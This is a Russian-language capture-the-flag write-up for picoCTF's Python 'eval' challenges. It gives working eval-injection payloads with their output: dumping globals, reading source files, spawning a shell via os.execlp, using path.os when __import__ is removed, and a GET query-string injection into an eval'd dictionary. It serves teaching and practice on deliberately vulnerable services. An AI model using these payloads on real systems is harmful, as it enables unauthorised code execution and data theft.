Разбор [задачек по Eval](https://github.com/xairy/mipt-ctf/tree/master/01-intro/03-eval).

## eval1

Программа просит пользователя просят ввести два числа: `x` и `y`.
После считывания `x` шифруется с помощью символов неизвестного нам флага.
Для получения флага необходимо, чтобы `x` и `y` удовлетворяли условию `y / 6 + 7 - y == x`.

### Решение 1

Поскольку `input` считывает строку и вычисляет от нее `eval`, то можно сделать так: `x` ввести произвольное, а в качестве `y` ввести выражение, которое зависит от `x` и удовлетворяет требуемому условию.

```
$ nc python.picoctf.com 6361
Welcome to mystery math!
Enter number 1> 1.0     
Enter number 2> (x - 7) * 6 / (-5)
Here ya go!  eval_is_best_thing_evar
```

### Решение 2

Другой вариант решения состоит в выводе всех доступных глобальных переменных с помощью функции `globals()`.
Это можно сделать таким образом:

```
$ nc python.picoctf.com 6361
Welcome to mystery math!
Enter number 1> __import__('sys').stdout.write(str(globals()))
{'__builtins__': <module '__builtin__' (built-in)>, '__file__': '/home/py1/task1.py', '__package__': None, 'flag': 'eval_is_best_thing_evar', '__name__': '__main__', '__doc__': None}Traceback (most recent call last):
  File "/home/py1/task1.py", line 9, in <module>
    x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
TypeError: unsupported operand type(s) for *: 'NoneType' and 'NoneType'
```

Можно заметить, что программа упала с ошибкой (`write` вернул `None`, а программа ожидала число и хотела использовать операцию умножения), но сначала все-таки вывела все глобальные переменные.

### Решение 3

Еще одно решение состоит в прочтении файла с исходным кодом сервиса.
Для начала нужно узнать как называется файл:

```
$ nc python.picoctf.com 6361
Welcome to mystery math!
Enter number 1> __import__('sys').stdout.write(str(__import__('os').listdir(__import__('os').getcwd())))
['run.sh', 'task1.py']Traceback (most recent call last):
  File "/home/py1/task1.py", line 9, in <module>
    x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
TypeError: unsupported operand type(s) for *: 'NoneType' and 'NoneType'
```

А теперь можно вывести его содержимое:

```
$ nc python.picoctf.com 6361
Welcome to mystery math!
Enter number 1> __import__('sys').stdout.write(open('task1.py').read())
#!/usr/bin/python -u
# task1.py
print "Welcome to mystery math!"

flag = "eval_is_best_thing_evar"

while True:
  x = input("Enter number 1> ")
  x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
  y = input("Enter number 2> ")
  if y / 6 + 7 - y == x:
    print "Here ya go! ", flag
    exit(0)
  else:
    print "Your lucky number is ", x - y
Traceback (most recent call last):
  File "/home/py1/task1.py", line 9, in <module>
    x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
TypeError: unsupported operand type(s) for *: 'NoneType' and 'NoneType'
```

### Решение 4

Также можно получить доступ к консоли и прочитать файл оттуда:

```
$ nc python.picoctf.com 6361
Welcome to mystery math!
Enter number 1> __import__('os').execlp('sh', 'sh')
ls
run.sh
task1.py
cat task1.py
#!/usr/bin/python -u
# task1.py
print "Welcome to mystery math!"

flag = "eval_is_best_thing_evar"

while True:
  x = input("Enter number 1> ")
  x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
  y = input("Enter number 2> ")
  if y / 6 + 7 - y == x:
    print "Here ya go! ", flag
    exit(0)
  else:
    print "Your lucky number is ", x - y
```

## eval2

Эта программа предлагает юзеру ввести 5 любых цифр, разделенных запятой.
Они по одной сравниваются с 5 случайно сгенеренными неизвестными цифрами, и программа выводит результат сравнения.

Внимательно посмотрев на исходник, можно понять, что программа примет не только разделенные запятыми цифры, но и любую строку длины 5.
В качестве этой строки можно воспользоваться срезом неизвестной строки flag.
Перебрав несколько таких срезов, можно посимвольно собрать эту строку.

```
$ nc python.picoctf.com 6362
Master Mind Game
I've set my code. Guess it!
Rules: You should input your guesses as 5 digits separated by commas.
       I will respond by marking the correct digits with a 2, marking
       digits in the wrong place with a 1, and marking wrong digits 0.
guess> flag[0:5]
 --------------------- 
 | i | _ | a | r | e | 
 --------------------- 
 --------------------- 
 | 0 | 0 | 0 | 0 | 0 | 
 ---------------------
...
guess> flag[20:25]
 --------------------- 
 | r | m | i | n | d | 
 --------------------- 
 --------------------- 
 | 0 | 0 | 0 | 0 | 0 | 
 --------------------- 
guess> flag[21:26]
You must guess a 5-digit code!
```

Решения 2-4 из задачи eval1 тут тоже работают.

## eval3

В этой задачке возможность импортировать модули с помощью встроенной функции `__import__` у нас отобрали.
Но зато оставили нам уже заимпортированный модуль `path`.

Если внимательно посмотреть на его атрибуты с помощью функции `dir`, то можно заметить, что `path` содержит ссылку на модуль `os`:

```
$ python
>>> from os import path
>>> dir(path)
['__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_joinrealpath', '_unicode', '_uvarprog', '_varprog', 'abspath', 'altsep', 'basename', 'commonprefix', 'curdir', 'defpath', 'devnull', 'dirname', 'exists', 'expanduser', 'expandvars', 'extsep', 'genericpath', 'getatime', 'getctime', 'getmtime', 'getsize', 'isabs', 'isdir', 'isfile', 'islink', 'ismount', 'join', 'lexists', 'normcase', 'normpath', 'os', 'pardir', 'pathsep', 'realpath', 'relpath', 'samefile', 'sameopenfile', 'samestat', 'sep', 'split', 'splitdrive', 'splitext', 'stat', 'supports_unicode_filenames', 'sys', 'walk', 'warnings']
```

А значит можно все также воспользоваться функцией `execlp` и получить доступ к консоли:

```
$ nc python.picoctf.com 6363
Welcome to the food menu!
Which description do you want to read?
[ 0] $ 7.69 Chicken Asada Burrito
[ 1] $ 6.69 Beef Chow Mein
[ 2] $ 10.49 MeatBurger Deluxe
> path.os.execlp('sh', 'sh')
ls
run.sh
task3.py
your_flag_here
cat your_flag_here
eval_is_super_OSsome
```

## eval4

В этой задачке необходимо найти уязвимость в веб сервисе, который использует функцию `eval`.

Общение с веб сервисами происходит по протоколу [HTTP](https://ru.wikipedia.org/wiki/HTTP).
Один из способов сделать [GET запрос](https://ru.wikipedia.org/wiki/HTTP#GET) это отправить его в текстовом виде с помощью `nc`:
```
$ nc python.picoctf.com 6364
GET /stage4.html


<p><html lang="en">
<head>
<meta charset="utf-8">
<title>Python eval</title>
<link rel="stylesheet" type="text/css" href="codehilite.css" media="screen" />
</head>
<body></p>
<h2>Part 4</h2>
<h3>Task 4</h3>
...
<p></body>
</html></p>
```

В этом сервисе параметры GET запросы преобразуются в питоновский словарь с помощью функции `eval`:
```
temp = url.rsplit('?', 1)
temp = temp[1].rsplit('#', 1)[0] # Split away fragment id
temp = temp.replace('=', '":"').replace('&', '","') # Turn into python dictonary syntax
query = eval('{"' + temp + '"}')
```

Можно заметить, что если `temp` содержит двойную кавычку, то содержимое `temp` после этой кавычки будет интерпретироваться не как строка, а как исполняемый код.
При этом содержимое `temp` не должно ломать парсер Питона.

Теперь осталось только сделать `exec`.
Один из самых простых вариантов:
```
$ nc python.picoctf.com 6364
GET /?"+(__builtins__.__import__('os').execlp('sh','sh'))+"

ls
index.html
run.sh
stage1.html
stage2.html
stage3.html
stage4.html
super_awesome_flag
task4.py
```

В результате вызов функции `eval` будет эквивалентен:
```
eval('{""+(__builtins__.__import__('os').execlp('sh','sh'))+""}')
```

И будет исполнено:
```
{ "" + (__builtins__.__import__('os').execlp('sh','sh')) + "" }
```

Если бы исполнение кода проложалось после вызова функции `execlp`, то произошла бы ошибка.
Однако `execlp` делает `exec`, и питоновский код дальше не исполняется.

## eval5

http://www.gilgalab.com.br/python/security/2013/05/06/Write-up-PicoCTF-python-eval-5/
